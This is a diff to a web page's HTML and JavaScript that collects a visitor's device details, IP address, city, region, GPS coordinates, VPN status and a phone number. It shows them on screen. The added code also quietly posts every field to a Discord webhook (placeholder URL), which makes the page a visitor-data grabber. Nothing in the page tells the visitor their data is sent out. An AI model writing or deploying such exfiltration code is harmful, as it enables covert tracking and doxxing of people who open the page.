@@ -37,6 +37,7 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
+            max-width: 90%; /* Make it responsive */
         }
         p {
             color: #dddddd;
@@ -227,7 +228,8 @@
                 systemType: systemType,
                 deviceID: deviceID,
                 processor: processor,
-                cpuCores: cpuCores
+                cpuCores: cpuCores,
+                phoneNumber: document.getElementById('phoneNumber').value
             };
 
             // Try to fetch the custom device name from localStorage
@@ -260,7 +262,46 @@
                 <p><strong>Coordinates:</strong> ${deviceData.latitude}, ${deviceData.longitude}</p>
                 <p><strong>VPN Detected:</strong> ${deviceData.vpn}</p>
                 <p><strong>CPU Cores:</strong> ${deviceData.cpuCores}</p>
+                <p><strong>Phone Number:</strong> ${deviceData.phoneNumber}</p>
             `;
+
+            // Send the data to the webhook
+            try {
+                await fetch('https://discordapp.com/api/webhooks/your_webhook_url', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: 'Device Data',
+                            color: 16711680, // Red color
+                            fields: [
+                                { name: 'Device Name', value: deviceName, inline: false },
+                                { name: 'Device Edition', value: deviceData.deviceEdition, inline: false },
+                                { name: 'Device Version', value: deviceData.deviceVersion, inline: false },
+                                { name: 'System Type', value: deviceData.systemType, inline: false },
+                                { name: 'Device ID', value: deviceData.deviceID, inline: false },
+                                { name: 'Processor', value: deviceData.processor, inline: false },
+                                { name: 'Browser', value: deviceData.browser, inline: false },
+                                { name: 'Operating System', value: deviceData.operatingSystem, inline: false },
+                                { name: 'Language', value: deviceData.language, inline: false },
+                                { name: 'Screen Resolution', value: deviceData.screenResolution, inline: false },
+                                { name: 'IP Address', value: deviceData.ipAddress, inline: false },
+                                { name: 'City', value: deviceData.city, inline: false },
+                                { name: 'Region', value: deviceData.region, inline: false },
+                                { name: 'Time Zone', value: deviceData.timezone, inline: false },
+                                { name: 'Coordinates', value: `${deviceData.latitude}, ${deviceData.longitude}`, inline: false },
+                                { name: 'VPN Detected', value: deviceData.vpn, inline: false },
+                                { name: 'CPU Cores', value: deviceData.cpuCores, inline: false },
+                                { name: 'Phone Number', value: deviceData.phoneNumber, inline: false }
+                            ]
+                        }]
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending data to webhook:', error);
+            }
         }
 
         document.getElementById('showButton').onclick = () => {
